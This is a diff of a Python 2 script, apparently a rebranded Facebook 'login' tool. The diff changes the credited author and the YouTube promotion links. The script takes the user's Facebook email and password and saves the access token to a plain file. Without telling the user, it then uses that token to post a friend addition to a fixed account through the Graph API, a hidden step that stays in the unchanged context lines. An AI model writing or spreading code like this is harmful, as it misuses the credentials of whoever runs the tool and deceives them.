@@ -269,7 +269,7 @@ def login1():
 		os.system('clear')
                 time.sleep(0.05)
 		print logo                
-		print "\033[1;97m•-----------------\033[1;37mBlack_Tiger\033[1;97m-----------------•"
+		print "\033[1;97m•-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------•"
 		print('\033[1;97m[+]\033[1;47m\033[1;31mLOGIN WITH FACEBOOK\x1b[1;97m \033[1;0m' )
 		print('	' )
 		id = raw_input('\033[1;97m[!] \x1b[1;97mNumber/Email\x1b[1;97m: \x1b[1;97m')
@@ -300,8 +300,8 @@ def login1():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\033[1;47m\033[1;91mBlack_Tiger Login Successful\033[1;0m'
-				os.system('xdg-open https://youtu.be/_nr3g4imVxI')
+				print '\033[1;47m\033[1;91mBinyamin_jan Login Successful\033[1;0m'
+				os.system('xdg-open https://www.youtube.com/channel/UCZgglszllvTPgtyiKddsU3w')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -314,7 +314,7 @@ def login1():
 			keluar()
 		else:
 			print("\n\x1b[1;97mPassword/Email is wrong")
-			os.system('xdg - open  https://www.youtube.com/channel/UCZgglszllvTPgtyiKddsU3w')
+			os.system('xdg - open https://www.youtube.com/channel/UCZgglszllvTPgtyiKddsU3w')
 			time.sleep(1)
 			login()
 			
